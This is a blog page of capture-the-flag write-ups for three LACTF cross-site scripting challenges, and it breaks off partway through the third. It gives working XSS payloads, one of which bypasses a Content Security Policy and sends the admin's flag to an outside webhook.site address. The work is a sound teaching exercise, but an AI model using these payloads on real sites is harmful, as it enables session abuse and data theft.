<!DOCTYPE html>
<html>
<link rel="stylesheet" href="/static/styles/bootstrap.css">

<link rel="stylesheet"
      href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.7.0/build/styles/default.min.css">
<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.7.0/build/highlight.min.js"></script>
<script>hljs.highlightAll();</script>


<head>
  <title>Github Pages - Jaquiez</title>
</head>

<body>
    <header>
        <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
          <div class="container-fluid">
            <a class="navbar-brand" href="/">/</a>
            <ul class="navbar-nav me-auto">
              <li class="nav-item">
                <a class="nav-link" href="/Blog/">/Blog</a>
              </li>
              <li class="nav-item">
                <a class="nav-link" href="/Projects/">/Projects</a>
              </li>
              <li class="nav-item">
                <a class="nav-link" href="/Contact/">/Contact</a>
              </li>
            </ul>
          </div>
        </nav>
    </header>
    <div id="intro" style="text-align: center;">
        <h1 class="code-line" data-line-start=0 data-line-end=1><strong>LACTF Writeups</strong></h1>
        <p class="has-line-data" data-line-start="2" data-line-end="3">Since its the first weekend of the semester I had time to play a bit of LACTF and really dig deep into a few of its challenges. However, it seems I only felt inclined to check out the XSS challenges. XSS challenges are fun though so I hope nobody is complaining :).</p>    
    </div>

    <div class="card">
        <div class="card-body">
        <h4 class="card-title" id="Metaverse" ><a href="#Metaverse"><strong>Metaverse</strong></a></h4>

        <p class="card-text">
        <div style="margin-left: 15px;">
                <p class="has-line-data" data-line-start="6" data-line-end="8">The first challenge I approached was metaverse, I solved it early int he CTF but in the end it had many solves so it seems like it was relatively straightforward for your average web player.<br>
                    <img src="./images/metaverse.png" width=50%></p>
                    <h3 class="code-line" data-line-start=9 data-line-end=10><a id="Initial_Thoughts_9"></a>Initial Thoughts</h3>
                    <p class="has-line-data" data-line-start="11" data-line-end="12">Looking through at the challenge description we have three places we can start looking <code>https://metaverse.lac.tf/login</code> is the site, <code>https://admin-bot.lac.tf/metaverse</code> is our admin bot, and we have a file called <code>index.js</code> available for download. If you know much about CTFs the admin bot usually implies XSS. This admin bot will simulate an admin user visiting the link we send them.</p>
                    <h3 class="code-line" data-line-start=14 data-line-end=15><a id="Lets_look_at_the_code_14"></a>Let's look at the code</h3>
                    <p class="has-line-data" data-line-start="15" data-line-end="16">Okay so we know we need an XSS so let's see where the flag is in the source code.</p>
                    <p class="has-line-data" data-line-start="18" data-line-end="19"><code>index.js</code></p>
                    <pre><code class="has-line-data" data-line-start="20" data-line-end="60" class="language-js">accounts.set(<span class="hljs-string">"admin"</span>, {
password: adminpw,
displayName: flag,
posts: [],
friends: [],
});
<span class="hljs-comment">/*
some express code here...
*/</span>
app.post(<span class="hljs-string">"/friend"</span>, needsAuth, (req, res) =&gt; {
    res.type(<span class="hljs-string">"text/plain"</span>);
    <span class="hljs-keyword">const</span> username = req.body.username.trim();
    <span class="hljs-keyword">if</span> (!accounts.has(username)) {
        res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">"Metauser doesn't metaexist"</span>);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">const</span> user = accounts.get(username);
        <span class="hljs-keyword">if</span> (user.friends.includes(res.locals.user)) {
            res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">"Already metafriended"</span>);
        } <span class="hljs-keyword">else</span> {
            user.friends.push(res.locals.user);
            res.status(<span class="hljs-number">200</span>).send(<span class="hljs-string">"ok"</span>);
        }
    }
});
app.get(<span class="hljs-string">"/friends"</span>, needsAuth, (req, res) =&gt; {
    res.type(<span class="hljs-string">"application/json"</span>);
    res.send(
        <span class="hljs-built_in">JSON</span>.stringify(
            accounts
                .get(res.locals.user)
                .friends.filter((username) =&gt; accounts.has(username))
                .map((username) =&gt; ({
                    username,
                    displayName: accounts.get(username).displayName,
                }))
        )
    );
});
</code></pre>
                    <p class="has-line-data" data-line-start="61" data-line-end="62"><code>index.html</code></p>
<pre><code class="has-line-data" data-line-start="63" data-line-end="79" class="language-js">fetch(<span class="hljs-string">"/friends"</span>)
    .then((res) =&gt; res.json())
    .then((friends) =&gt; {
        <span class="hljs-keyword">const</span> list = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"friendlist"</span>);
        <span class="hljs-keyword">if</span> (friends.length === <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">const</span> ele = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">"p"</span>);
            ele.innerText = <span class="hljs-string">"you have none :("</span>;
            list.appendChild(ele);
        }
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> f <span class="hljs-keyword">of</span> friends) {
            <span class="hljs-keyword">const</span> ele = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">"p"</span>);
            ele.innerText = <span class="hljs-string">`<span class="hljs-subst">${f.displayName}</span> (<span class="hljs-subst">${f.username}</span>)`</span>;
            list.appendChild(ele);
        }
    });
</code></pre>
                    <p class="has-line-data" data-line-start="79" data-line-end="80">So the flag is set as the display name of the admin user. The display name of users is accessed when the client goes to their dashboard and a display names are added via the <code>/friends</code> endpoints. So we need an XSS payload that will execute a post request to <code>/friend</code> become mutual “metafriends” with admin.</p>
                    <h3 class="code-line" data-line-start=81 data-line-end=82><a id="Exploit_setup_81"></a>Exploit setup</h3>
                    <p class="has-line-data" data-line-start="82" data-line-end="83">First we can send our meta-friend request to admin. You can either do this through the html or by running some Javscript in the console. Let's go with the latter so we can use it in our XSS payload.</p>
<pre><code class="has-line-data" data-line-start="85" data-line-end="93" class="language-js">fetch(<span class="hljs-string">'/friend'</span>,{
    method:<span class="hljs-string">'POST'</span>,
    headers:{
        <span class="hljs-string">"Content-type"</span>:<span class="hljs-string">'application/x-www-form-urlencoded'</span>
    },
    body:<span class="hljs-string">'username=admin'</span>
})
</code></pre>
                    <p class="has-line-data" data-line-start="94" data-line-end="95">A simple fetch request with the appropriate headers and we're good to go. Now we can test this <code>metapost</code> feature to see if XSS is possible through that vector. And looking at the code it seems to be the case. Our user content is directly replacing <code>$CONTENT</code> in the <code>post.html</code> file so it should be directly reflected to the user.</p>
<pre><code class="has-line-data" data-line-start="97" data-line-end="107" class="language-js"><span class="hljs-comment">// templating engines are for losers!</span>
<span class="hljs-keyword">const</span> postTemplate = fs.readFileSync(path.join(__dirname, <span class="hljs-string">"post.html"</span>), <span class="hljs-string">"utf8"</span>);
app.get(<span class="hljs-string">"/post/:id"</span>, (req, res) =&gt; {
    <span class="hljs-keyword">if</span> (posts.has(req.params.id)) {
        res.type(<span class="hljs-string">"text/html"</span>).send(postTemplate.replace(<span class="hljs-string">"$CONTENT"</span>, () =&gt; posts.get(req.params.id)));
    } <span class="hljs-keyword">else</span> {
        res.status(<span class="hljs-number">400</span>).type(<span class="hljs-string">"text/html"</span>).send(postTemplate.replace(<span class="hljs-string">"$CONTENT"</span>, <span class="hljs-string">"post not found :("</span>));
    }
});
</code></pre>
                    <p class="has-line-data" data-line-start="107" data-line-end="108"><img src="./images/metapost.png" width=50% width="50%"></p>
                    <p class="has-line-data" data-line-start="109" data-line-end="110"><img src="./images/xss.png" width=50% width="50%"></p>
                    <h3 class="code-line" data-line-start=110 data-line-end=111><a id="Exploitation_110"></a>Exploitation</h3>
                    <p class="has-line-data" data-line-start="111" data-line-end="112">So putting this together we should be able to make a POST request to <code>/friend</code> via our XSS vector. So now we have the final payload and make a metapost with it as our content.</p>
<pre><code class="has-line-data" data-line-start="114" data-line-end="124" class="language-html"><span class="hljs-tag">&lt;<span class="hljs-title">script</span>&gt;</span><span class="actionscript">
fetch(<span class="hljs-string">'/friend'</span>,{
    method:<span class="hljs-string">'POST'</span>,
    headers:{
        <span class="hljs-string">"Content-type"</span>:<span class="hljs-string">'application/x-www-form-urlencoded'</span>
    },
    body:<span class="hljs-string">'username=bruhman420'</span>
})
</span><span class="hljs-tag">&lt;/<span class="hljs-title">script</span>&gt;</span>
</code></pre>
                    <p class="has-line-data" data-line-start="125" data-line-end="126">Finally, send the admin bot the url to our metapost and we should be greeted with the flag once we refresh our dashboard.</p>
                    <p class="has-line-data" data-line-start="127" data-line-end="128"><img src="./images/ez.png" width=50% width="50%"></p>
                    <h3 class="code-line" data-line-start=129 data-line-end=130><a id="Final_Thoughts_129"></a>Final Thoughts</h3>
                    <p class="has-line-data" data-line-start="130" data-line-end="131">Overall this was a very nice beginner challenge. I feel like it got people thinking about the code rather than copy pasting generic payloads.</p>
        </div>
        
        </p>
    </div>
    </div>
    <div class="card">
        <div class="card-body">
            <h4 class="card-title" id="CSP"><a href="#CSP"><strong>California State Police</strong></a></h4>

            <p class="card-text">
                <div style="margin-left: 15px;">
                    <p class="has-line-data" data-line-start="135" data-line-end="136">As I noted earlier, this was an only XSS ctf for me at least. So let's dive into the appropriately named California State Police challenge.</p>
                    <p class="has-line-data" data-line-start="137" data-line-end="138"><img src="./images/csp.png" width=50%></p>
                    <h3 class="code-line" data-line-start=138 data-line-end=139><a id="Initial_Thoughts_138"></a>Initial Thoughts</h3>
                    <p class="has-line-data" data-line-start="140" data-line-end="141">As the punny name and admin bot suggest this is another XSS challenge! First thing is first, we note that the cookie is <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies">HttpOnly</a> meaning we cannot access it using <code>document.cookie</code>. With this we can start to get an idea of what exploitation is possible.</p>
                    <h3 class="code-line" data-line-start=142 data-line-end=143><a id="Lets_Look_at_the_Code_142"></a>Let's Look at the Code</h3>
                    <p class="has-line-data" data-line-start="144" data-line-end="145">Let's not get ahead of ourselves though! Before we can think about exploitation we should check out this <code>index.js</code> file.</p>
                    <pre><code class="has-line-data" data-line-start="147" data-line-end="191" class="language-js">app.get(<span class="hljs-string">"/flag"</span>, (req, res) =&gt; {
    res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">"you have to POST the flag this time &gt;:)"</span>);
});
app.post(<span class="hljs-string">"/flag"</span>, (req, res) =&gt; {
    <span class="hljs-keyword">if</span> (req.cookies.adminpw === adminpw) {
        res.send(flag);
    } <span class="hljs-keyword">else</span> {
        res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">"no hacking allowed"</span>);
    }
});
app.use((req, res, next) =&gt; {
    res.set(
        <span class="hljs-string">"Content-Security-Policy"</span>,
        <span class="hljs-string">"default-src 'none'; script-src 'unsafe-inline'"</span>
    );
    next();
});
app.post(<span class="hljs-string">"/report"</span>, (req, res) =&gt; {
    res.type(<span class="hljs-string">"text/plain"</span>);
    <span class="hljs-keyword">const</span> crime = req.body.crime;
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> crime !== <span class="hljs-string">"string"</span>) {
        res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">"no crime provided"</span>);
        <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-keyword">if</span> (crime.length &gt; <span class="hljs-number">2048</span>) {
        res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">"our servers aren't good enough to handle that"</span>);
        <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-keyword">const</span> id = uuid();
    reports.set(id, crime);
    cleanup.push([id, <span class="hljs-built_in">Date</span>.now() + <span class="hljs-number">1000</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">3</span>]);
    res.redirect(<span class="hljs-string">"/report/"</span> + id);
});
app.get(<span class="hljs-string">"/report/:id"</span>, (req, res) =&gt; {
    <span class="hljs-keyword">if</span> (reports.has(req.params.id)) {
        res.type(<span class="hljs-string">"text/html"</span>).send(reports.get(req.params.id));
    } <span class="hljs-keyword">else</span> {
        res.type(<span class="hljs-string">"text/plain"</span>).status(<span class="hljs-number">400</span>).send(<span class="hljs-string">"report doesn't exist"</span>);
    }
});
                    </code></pre>
                    <p class="has-line-data" data-line-start="191" data-line-end="192">So we our flag is only accessible by admin on the <code>/flag</code> endpoint with the POST method. So we'll need the admin bot to post to <code>/flag</code> then send us the response. How can we achieve this? By submitting a totally valid report of course! Reports are plaintext received from the user and directly sent when navigating to <code>/report/:id</code>. So submit a report that contains an XSS payload that sends the data from <code>/flag</code> back to us. Easy! Or maybe not…</p>
                    <h3 class="code-line" data-line-start=193 data-line-end=194><a id="Naive_Attempts_193"></a>Naive Attempts</h3>
                    <p class="has-line-data" data-line-start="195" data-line-end="196">Despite that ominous warning let's go ahead with our naive approach. We'll report a crime with the payload</p>
<pre><code class="has-line-data" data-line-start="197" data-line-end="201" class="language-html"><span class="hljs-tag">&lt;<span class="hljs-title">script</span>&gt;</span><span class="actionscript">
fetch(<span class="hljs-string">'/flag'</span>,{method:<span class="hljs-string">'POST'</span>});
</span><span class="hljs-tag">&lt;/<span class="hljs-title">script</span>&gt;</span>
</code></pre>
                    <p class="has-line-data" data-line-start="201" data-line-end="204"><img src="./images/attempt1.png" width=50%><br>
                    <img src="./images/reject.png" width=50%><br>
                    <img src="https://media.tenor.com/RjfbjPcbZk0AAAAd/walter-white.gif" width=50%></p>
                    <p class="has-line-data" data-line-start="205" data-line-end="206">So it looks like our report executes the javascript but there is something we did not look at carefully in the code. <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Content Security Policy (CSP)</a> mitigates our ability to execute arbitrary code and requests through XSS. The server response header for Content Security Policy specifies <code>default-src 'none'; script-src 'unsafe-inline'</code>.</p>
                    <p class="has-line-data" data-line-start="207" data-line-end="208"><img src="./images/csp2.png" width=50%></p>
                    <p class="has-line-data" data-line-start="209" data-line-end="210">What does this mean? We are allowed to use <code>unsafe-inline</code> for script tags so that's why our Javascript is executed. But <code>default-src 'none'</code> meaning no resources are allowed to load, even ones served directly from the server.</p>
                    <h3 class="code-line" data-line-start=211 data-line-end=212><a id="Its_Time_to_Cook_211"></a>It's Time to Cook</h3>
                    <p class="has-line-data" data-line-start="212" data-line-end="213"><img src="https://media.tenor.com/hRxU7RYOlMkAAAAC/breaking-bad-chemistry.gif" width=50%></p>
                    <p class="has-line-data" data-line-start="214" data-line-end="215">At this point I got stuck for a while, how are we supposed to make a post request if all requests are blocked? But then I realized, we are sending a post request from the browser to upload our report! How does the site do that?</p>
<pre><code class="has-line-data" data-line-start="217" data-line-end="236" class="language-html"><span class="hljs-doctype">&lt;!DOCTYPE html&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-title">html</span> <span class="hljs-attribute">lang</span>=<span class="hljs-value">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-title">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-title">meta</span> <span class="hljs-attribute">charset</span>=<span class="hljs-value">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-title">meta</span> <span class="hljs-attribute">http-equiv</span>=<span class="hljs-value">"X-UA-Compatible"</span> <span class="hljs-attribute">content</span>=<span class="hljs-value">"IE=edge"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-title">meta</span> <span class="hljs-attribute">name</span>=<span class="hljs-value">"viewport"</span> <span class="hljs-attribute">content</span>=<span class="hljs-value">"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-title">title</span>&gt;</span>California State Police<span class="hljs-tag">&lt;/<span class="hljs-title">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-title">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-title">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-title">h1</span>&gt;</span>California State Police<span class="hljs-tag">&lt;/<span class="hljs-title">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-title">p</span>&gt;</span>Our site has been upgraded to use the latest security features, but for some reason we can't use CSS anymore. It'll probably be fine, no one really cares about styling anyways right?<span class="hljs-tag">&lt;/<span class="hljs-title">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-title">h2</span>&gt;</span>Need to report a crime?<span class="hljs-tag">&lt;/<span class="hljs-title">h2</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-title">form</span> <span class="hljs-attribute">method</span>=<span class="hljs-value">"POST"</span> <span class="hljs-attribute">action</span>=<span class="hljs-value">"/report"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-title">textarea</span> <span class="hljs-attribute">name</span>=<span class="hljs-value">"crime"</span> <span class="hljs-attribute">placeholder</span>=<span class="hljs-value">"crime details..."</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-title">textarea</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-title">br</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-title">input</span> <span class="hljs-attribute">type</span>=<span class="hljs-value">"submit"</span> <span class="hljs-attribute">value</span>=<span class="hljs-value">"Report Crime"</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-title">form</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-title">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-title">html</span>&gt;</span>
</code></pre>
                    <p class="has-line-data" data-line-start="237" data-line-end="238">So the report is posted using a form, and if we try something similar with <code>/flag</code> it should work. With HTML and Javascript this is not too difficult with a bit of help from documentation and StackOverflow.</p>
<pre><code class="has-line-data" data-line-start="240" data-line-end="245" class="language-html"><span class="hljs-tag">&lt;<span class="hljs-title">form</span> <span class="hljs-attribute">method</span>=<span class="hljs-value">"post"</span> <span class="hljs-attribute">id</span>=<span class="hljs-value">"theForm"</span> <span class="hljs-attribute">action</span>=<span class="hljs-value">"/flag"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-title">form</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-title">script</span>&gt;</span><span class="javascript"> 
    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'theForm'</span>).submit();
</span><span class="hljs-tag">&lt;/<span class="hljs-title">script</span>&gt;</span>
</code></pre>
                    <p class="has-line-data" data-line-start="246" data-line-end="247"><img src="./images/progress.png" width=50%></p>
                    <p class="has-line-data" data-line-start="249" data-line-end="250">Nice the post request worked but we were redirected. That's not good since we want to read the response and send it to ourselves. So I got stuck again for a while and started googling… Until I stumbled upon <a href="https://lalitjc.wordpress.com/2013/05/03/2/">this post</a>! They provided the following template:</p>
<pre><code class="has-line-data" data-line-start="252" data-line-end="270" class="language-js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">openWindow</span>(<span class="hljs-params"></span>)</span>{
    <span class="hljs-keyword">var</span> form = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'FORM'</span>);
    form.method=<span class="hljs-string">'POST'</span>;
    form.action = <span class="hljs-string">'PageToOpen.html'</span>;
    form.target = <span class="hljs-string">'newWindow'</span>; <span class="hljs-comment">// Specify the name of the window(second parameter to window.open method.)</span>
    <span class="hljs-keyword">var</span> input = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">"INPUT"</span>);
    input.id=<span class="hljs-string">"q"</span>;
    input.type=<span class="hljs-string">"hidden"</span>;
    input.value=<span class="hljs-string">"SOme large content"</span>;
    form.appendChild(input);
    <span class="hljs-built_in">document</span>.body.appendChild(form);
    <span class="hljs-built_in">window</span>.open(<span class="hljs-string">""</span>,<span class="hljs-string">"newWindow"</span>,<span class="hljs-string">"location=yes,width=400,height=400"</span>);
    form.submit();
}</code></pre>
                    <p class="has-line-data" data-line-start="271" data-line-end="272">So it looks like they are creating a new form that is posting to <code>PageToOpen.html</code> and the output of the form is targeted to the <code>'newWindow'</code> that is opened. So the form submits and POSTs but it will be in the new window meaning we still have JavaScript execution in our current window. Let's craft a payload that does this then:</p>
<pre><code class="has-line-data" data-line-start="275" data-line-end="287" class="language-html"><span class="hljs-tag">&lt;<span class="hljs-title">form</span> <span class="hljs-attribute">method</span>=<span class="hljs-value">"post"</span> <span class="hljs-attribute">id</span>=<span class="hljs-value">"theForm"</span> <span class="hljs-attribute">action</span>=<span class="hljs-value">"/flag"</span> <span class="hljs-attribute">target</span>=<span class="hljs-value">'bruh'</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- Form body here --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-title">form</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-title">script</span>&gt;</span><span class="javascript"> 
    <span class="hljs-keyword">let</span> w = <span class="hljs-built_in">window</span>.open(<span class="hljs-string">''</span>,<span class="hljs-string">'bruh'</span>);
    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'theForm'</span>).submit();
    setTimeout(()=&gt;{
        <span class="hljs-built_in">document</span>.location= <span class="hljs-string">`https://webhook.site/645c6365-01c7-4535-a172-a9014e389741?c=<span class="hljs-subst">${w.document.body.innerHTML}</span>`</span>
    },<span class="hljs-number">500</span>);
</span><span class="hljs-tag">&lt;/<span class="hljs-title">script</span>&gt;</span>
</code></pre>
                    <p class="has-line-data" data-line-start="288" data-line-end="289">Our payload will open a new window <code>bruh</code> which we store as a variable in our current program. We then submit the form that POSTs to <code>/flag</code> and targets (executes in) <code>bruh</code>. Then we'll <code>setTimeout</code> to give some time for the form to submit and receive the response in the window before we redirect to our attack controlled site with the data we need.</p>
                    <p class="has-line-data" data-line-start="290" data-line-end="291"><img src="./images/nice.png" width=50%></p>
                    <p class="has-line-data" data-line-start="293" data-line-end="294">Nice! It worked how we expected but why? According to the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/open">MDN Docs</a> <code>window.open</code> will open a blank new tab in our targeted context meaning that as long we are in the same domain we can access its contents through our Javascript. Okay let's send this to admin bot.</p>
                    <p class="has-line-data" data-line-start="295" data-line-end="297"><img src="./images/win.png" width=50%><br>
                    <img src="https://media.tenor.com/n5ULG9d1MVgAAAAC/highfive-hyped.gif" width=50%></p>
                    <p class="has-line-data" data-line-start="298" data-line-end="299">And there's the flag!</p>
                    <h3 class="code-line" data-line-start=299 data-line-end=300><a id="Final_Thoughts_299"></a>Final Thoughts</h3>
                    <p class="has-line-data" data-line-start="301" data-line-end="302">Overall this was a really interesting challenge as I never really did much with bypassing stricter CSP but I learned a lot through my research! Also it seems like there were additional solutions since both the <code>GET</code> and <code>POST</code> methods on <code>/flag</code> did not have a Content Security Policy header! The challenge author had their solution <a href="https://github.com/uclaacm/lactf-archive/blob/main/2023/web/california-state-police/solve.txt">here</a> if you want to check it out.</p>
                </div>
            </p>
        </div>    
    </div>
    <div class="card">
        <div class="card-body">
            <h4 class="card-title" id="hptla" ><a href="#hptla"><strong>hptla</strong></a></h4>

            <p class="card-text">
                <p class="has-line-data" data-line-start="305" data-line-end="306">So the final XSS challenge (and CTF challenge) I worked on was hptla. It had fewer solves but I found the path to exploitation a lot more straight forward than the last challenge.</p>
    <p class="has-line-data" data-line-start="307" data-line-end="308"><img src="./images/last.png" width=50%></p>
    <h3 class="code-line" data-line-start=310 data-line-end=311><a id="Initial_Thoughts__Code_Review_310"></a>Initial Thoughts &amp; Code Review</h3>
    <p class="has-line-data" data-line-start="312" data-line-end="313"><img src="https://media.tenor.com/cJRcMyUAiMcAAAAd/ah-shit-here-we-go-again-ah-shit.gif" width=50%></p>
    <p class="has-line-data" data-line-start="314" data-line-end="315">At this point you know the deal, admin bot means (probably) XSS! So let's go straight to source to get an idea of what we need.</p>
<pre><code class="has-line-data" data-line-start="317" data-line-end="366" class="language-js"><span class="hljs-comment">/*
express code above here
*/</span>
app.post(<span class="hljs-string">"/list"</span>, (req, res) =&gt; {
    res.type(<span class="hljs-string">"text/plain"</span>);
    <span class="hljs-keyword">const</span> list = req.body.list;
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> list !== <span class="hljs-string">"string"</span>) {
        res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">"no list provided"</span>);
        <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-keyword">const</span> parsed = list
        .trim()
        .split(<span class="hljs-string">"\n"</span>)
        .map((x) =&gt; x.trim());
    <span class="hljs-keyword">if</span> (parsed.length &gt; <span class="hljs-number">20</span>) {
        res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">"list must have at most 20 items"</span>);
        <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-keyword">if</span> (parsed.some((x) =&gt; x.length &gt; <span class="hljs-number">12</span>)) {
        res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">"list items must not exceed 12 characters"</span>);
        <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-keyword">const</span> id = uuid();
    lists.set(id, parsed);
    cleanup.push([id, <span class="hljs-built_in">Date</span>.now() + <span class="hljs-number">1000</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">3</span>]);
    res.send(id);
});
app.get(<span class="hljs-string">"/list/:id"</span>, (req, res) =&gt; {
    res.type(<span class="hljs-string">"application/json"</span>);
    <span class="hljs-keyword">if</span> (lists.has(req.params.id)) {
        res.send(lists.get(req.params.id));
    } <span class="hljs-keyword">else</span> {
        res.status(<span class="hljs-number">400</span>).send({error: <span class="hljs-string">"list doesn't exist"</span>});
    }
});
app.get(<span class="hljs-string">"/flag"</span>, (req, res) =&gt; {
    res.type(<span class="hljs-string">"text/plain"</span>);
    <span class="hljs-keyword">if</span> (req.cookies.adminpw === adminpw) {
        res.send(flag);
    } <span class="hljs-keyword">else</span> {
        res.status(<span class="hljs-number">401</span>).send(<span class="hljs-string">"haha no"</span>);
    }
});
<span class="hljs-comment">/*
express code below here
*/</span>
</code></pre>
    <p class="has-line-data" data-line-start="367" data-line-end="368">So we need to make a request to <code>/flag</code> on the admin bot and somehow send it to ourselves. The actual XSS is in this <code>/list</code> endpoints where we can post a payload consisting of a maximum of 20 lines with each having a maximum of 20 characters.</p>
    <h3 class="code-line" data-line-start=369 data-line-end=370><a id="Exploit_Setup_369"></a>Exploit Setup</h3>
    <p class="has-line-data" data-line-start="371" data-line-end="372">So let's just send a simple valid payload.</p>
    <p class="has-line-data" data-line-start="373" data-line-end="375"><img src="./images/tryharder.png" width=50%><br>
    <img src="./images/failed.png" width=50%></p>
    <p class="has-line-data" data-line-start="376" data-line-end="377">Hm it doesn't work. When we take a look at the HTML we can see it's loaded as the following.</p>
<pre><code class="has-line-data" data-line-start="379" data-line-end="394" class="language-html"><span class="hljs-tag">&lt;<span class="hljs-title">ul</span> <span class="hljs-attribute">id</span>=<span class="hljs-value">"list"</span> <span class="hljs-attribute">class</span>=<span class="hljs-value">""</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-title">li</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-title">input</span> <span class="hljs-attribute">type</span>=<span class="hljs-value">"checkbox"</span> <span class="hljs-attribute">id</span>=<span class="hljs-value">"item0"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-title">label</span> <span class="hljs-attribute">for</span>=<span class="hljs-value">"item0"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-title">img</span> <span class="hljs-attribute">src</span>=<span class="hljs-value">"1&lt;/label"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-title">label</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-title">li</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-title">li</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-title">input</span> <span class="hljs-attribute">type</span>=<span class="hljs-value">"checkbox"</span> <span class="hljs-attribute">id</span>=<span class="hljs-value">"item1"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-title">label</span> <span class="hljs-attribute">for</span>=<span class="hljs-value">"item1"</span>&gt;</span>onerror=<span class="hljs-tag">&lt;/<span class="hljs-title">label</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-title">li</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-title">li</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-title">input</span> <span class="hljs-attribute">type</span>=<span class="hljs-value">"checkbox"</span> <span class="hljs-attribute">id</span>=<span class="hljs-value">"item2"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-title">label</span> <span class="hljs-attribute">for</span>=<span class="hljs-value">"item2"</span>&gt;</span>print()&amp;gt;<span class="hljs-tag">&lt;/<span class="hljs-title">label</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-title">li</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-title">ul</span>&gt;</span>
</code></pre>
<p class="has-line-data" data-line-start="395" data-line-end="396">Okay at this point we can see that each value is embedded into a couple HTML attributes so we need a way to ignore the space between these and execute our code anyways. At this point I had the idea to use HTML comments.</p>
<pre><code class="has-line-data" data-line-start="398" data-line-end="410" class="language-html">&lt;ul id="list" class=""&gt;
    &lt;li&gt;&lt;input type="checkbox" id="item0"&gt;
        &lt;label for="item0"&gt;&lt;img sr&lt;!--&lt;="" label=""&gt;
        &lt;/label&gt;
    &lt;/li&gt;
    &lt;li&gt;
        &lt;input type="checkbox" id="item1"&gt;
        &lt;label for="item1"&gt;!--&amp;gt;c=1 &lt;!--&lt;/label&gt;&lt;/li&gt;
    &lt;li&gt;&lt;input type="checkbox" id="item2"&gt;&lt;label for="item2"&gt;!--&gt;oner&lt;!--&lt;/label&gt;&lt;/li&gt;&lt;li&gt;&lt;input type="checkbox" id="item3"&gt;&lt;label for="item3"&gt;!--&gt;ror=&lt;!--&lt;/label&gt;&lt;/li&gt;&lt;li&gt;&lt;input type="checkbox" id="item4"&gt;&lt;label for="item4"&gt;!--&gt;print()&amp;gt;&lt;/label&gt;
    &lt;/li&gt;
&lt;/ul&gt;
</code></pre>
